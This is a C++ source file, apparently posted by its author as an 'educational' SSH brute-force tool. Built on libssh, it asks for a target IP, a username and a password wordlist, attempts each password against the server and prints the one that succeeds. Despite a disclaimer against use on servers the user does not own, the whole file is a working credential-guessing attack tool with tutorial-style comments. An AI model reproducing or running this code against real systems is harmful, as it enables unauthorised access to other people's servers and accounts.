/*
Simple ssh brute force script in c++. 

~Coded by Aziz Kaplan~
~31.01.2021~

Note; this script is for educational purposes only. Don't use it on the servers that are not owned by you.



Note; I've developed this script in c++ but python is much faster in network programming. If you're considering coding something based on networking,
do it with python <3
*/

#include <iostream>
#include <fstream>
#include <libssh/libssh.h>
#include <sstream>

using namespace std;
int wordlist_(string path,int LIMIT,string *passwords,string serverIP,string username);
void ssh_connection(string password,int LIMIT,string serverIP,string username);
void open(const char* file,ios::openmode mode); 
/*const char* file means read content of the file byte by byte and write them as one string.
ios::openmode associates the stream object so we can input/output
And, mode function is a function of ios::openmode class. It helps us to open a file so we can read or write.
*/

void ssh_connection(string password,int LIMIT,string serverIP,string username){
    int port=22; //port number of ssh
    int arttir=0,arttir1=0;
  
    char parola[password.length() + 1]={};
    char serverADDRESS[serverIP.length() + 1]={};
    char uNAME[username.length() + 1]={};
    int rc; //this variable will be used for connecting to ssh server.
    char password_bytes[password.length()]={}; //passwords goes here
    ssh_session new_session = ssh_new(); //This function is used to allocate a new SSH session.
    int verbosity = SSH_LOG_PROTOCOL; // used for high level protocol information
    if (new_session == NULL)
        exit(1);else{
            for (int c = 0; c < password.length(); c++){
                parola[c]=(char)password[c];}do{
                    serverADDRESS[arttir]=serverIP[arttir];
                    arttir++;
            }while(arttir<=serverIP.length());do{
                uNAME[arttir1]=username[arttir1];
                arttir1++;
            }while(arttir1<=username.length());
        } //if the ssh session is NULL exit with failure
   
    ssh_options_set(new_session, SSH_OPTIONS_HOST, serverADDRESS); //in this option, we set the ip address of the server we wanna connect.
    ssh_options_set(new_session, SSH_OPTIONS_USER, uNAME); //in this option, we set the username of the server
    //ssh_options_set(new_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity); //Sets the session logging verbosity 
    ssh_options_set(new_session, SSH_OPTIONS_CIPHERS_C_S,"aes128-ctr"); // Sets the symmetric cipher client to server.
    rc = ssh_connect(new_session);
    if (rc != SSH_OK) //if the connection fails, return this:
    {
        fprintf(stderr, "Error: %s\n", ssh_get_error(new_session)); // The fprintf() function is used to write set of characters into file. It sends formatted output to a stream. You can't use stderr in your code when you use printf.
        //note that, stderr is used for a diagnostic output
        ssh_free(new_session); //Deallocate a SSH session handle
        
    }
        
    rc = ssh_userauth_password(new_session, NULL, parola);
    if (rc != SSH_AUTH_SUCCESS){//if the password is wrong;
        printf("Password Is NOT:");
        std::cout<<password<<"\n";
        
    }else{printf("PASSWORD FOUND! ~>");cout<<password<<"\n";exit(0);}
    ssh_free(new_session);
        
    
}
int wordlist_(string path,int LIMIT,string *passwords,string serverIP,string username){
    fstream file;
    int x=0;
    file.open(path,ios::in);
    if(!file){
        std::cout<<"Wrong Path For The Wordlist!";
        return 0;
    }
    else{
        string read_file;
        while (!file.eof())//eof function means end-of-file. It returns !0 when there are no more data to be read otherwise, returns 0
        {
            file>>read_file;


            passwords[x]=read_file;
            string value=passwords[x];
            x=x+1;
            ssh_connection(value,LIMIT,serverIP,username);
        }  
    }
    return 0;
}
int main(){
    string input_wordlist;
    int LIMIT=20000;
    string passwords[LIMIT]={}; //we'll add our passwords in here so we can try them one by one and we say the length of wordlist can't be longer than 20k. Otherwise script gives "zsh: segmentation fault  ./a.out" error.
    string usernames[LIMIT]={};
    string serverIP,username;
    cout<<"~Coded by Aziz Kaplan~"<<endl;
    cout<<"Github:AzizKpln"<<endl;
    cout<<"~31.01.2021~"<<endl;
    cout<<"Give The Server IP Address:"<<endl<<"=>";
    cin>>serverIP;
    cout<<"Give The USERNAME:"<<endl<<"=>"; 
    cin>>username;
    cout<<"Give The PASSWORD Wordlist File Path:"<<endl<<"=>"; 
    cin>>input_wordlist;
    wordlist_(input_wordlist,LIMIT,passwords,serverIP,username);
    
}